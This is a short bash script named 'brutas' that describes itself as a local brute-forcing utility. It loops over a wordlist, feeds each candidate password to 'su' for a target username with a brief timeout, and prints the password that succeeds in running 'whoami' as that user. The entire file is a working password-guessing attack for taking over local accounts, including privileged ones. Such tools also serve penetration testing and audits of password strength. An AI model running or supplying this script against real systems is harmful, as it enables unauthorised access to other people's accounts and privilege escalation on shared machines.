#!/bin/bash
#
# ░▒▓ brutas ▓▒░ Minimalistic local brute forcing utility using su
#
# Usage: brutas.sh <username> <newline-file>
#
# Source: http://github.com/tasooshi/brutas

IFS=$'\n' arr=($(cat $2))
SIZE=${#arr[@]}
TIMEOUT='0.25s'

for i in ${!arr[@]}; do
    echo -ne "%$(($i * 100 / $SIZE))\r"
    ( echo ${arr[i]} | timeout $TIMEOUT su - $1 -c 'whoami' 2>/dev/null | grep -ow $1 && echo ${arr[i]} && kill -INT -$$ &)
done
